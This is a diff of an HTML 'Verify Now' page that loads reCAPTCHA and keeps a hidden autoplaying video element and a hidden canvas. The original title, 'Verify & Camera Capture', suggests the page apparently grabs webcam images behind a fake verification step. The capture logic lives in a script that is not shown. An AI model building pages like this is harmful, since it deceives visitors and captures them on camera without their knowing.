@@ -3,77 +3,65 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verify & Camera Capture</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+<title>Verification</title>
+
 <style>
 body{
-  font-family:'Poppins',sans-serif;
+  font-family:Arial;
+  background: linear-gradient(135deg,#eef2f3,#dfe9f3);
   display:flex;
   justify-content:center;
   align-items:center;
   height:100vh;
   margin:0;
-  background: linear-gradient(135deg,#f5f7fa,#c3cfe2);
 }
 .container{
   background:white;
-  padding:30px;
-  border-radius:15px;
+  padding:25px;
+  border-radius:12px;
   box-shadow:0 10px 25px rgba(0,0,0,0.15);
-  width: 360px;
   text-align:center;
+  width:320px;
 }
-h2{color:#007BFF;margin-bottom:20px;}
 button{
-  padding:12px 30px;
+  padding:12px 25px;
   border:none;
-  border-radius:10px;
+  border-radius:8px;
+  background:#007bff;
+  color:white;
   font-size:16px;
   cursor:pointer;
-  background: linear-gradient(90deg,#007BFF,#00C6FF);
-  color:white;
-  transition:0.3s;
 }
 button:hover{
-  transform:translateY(-2px);
-  box-shadow:0 5px 15px rgba(0,0,0,0.2);
+  background:#0056b3;
 }
-#video{display:none;}
-#canvas{display:none;}
+video{display:none;}
+canvas{display:none;}
 #toast{
-  position:fixed;
-  bottom:30px;
-  left:50%;
-  transform:translateX(-50%);
-  background:#333;color:white;
-  padding:12px 25px;
-  border-radius:8px;
-  opacity:0;
-  transition:opacity 0.5s;
-}
-#recaptcha-section{
-  margin-top:20px;
-  display:none;
+  margin-top:15px;
+  color:green;
 }
 </style>
+
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
+
 <div class="container">
-  <h2>Verify Yourself</h2>
+  <h2>Verify</h2>
   <button id="verifyBtn">Verify Now</button>
+
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
 
-  <div id="recaptcha-section">
-    <h3>Complete the reCAPTCHA</h3>
-    <div class="g-recaptcha" 
-         data-sitekey="6Ldx7KQsAAAAABZ07LPdBkQ8kKecKHxVp80WJSGE" 
-         data-callback="onRecaptchaSuccess"></div>
-    <p id="recaptcha-msg" style="color:red;font-weight:bold;"></p>
+  <div id="recaptcha-section" style="display:none;margin-top:15px;">
+    <div class="g-recaptcha" data-sitekey="YOUR_SITE_KEY" data-callback="onRecaptchaSuccess"></div>
   </div>
+
+  <p id="toast"></p>
 </div>
-<div id="toast"></div>
-<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
 <script type="module" src="script.js"></script>
+
 </body>
 </html>
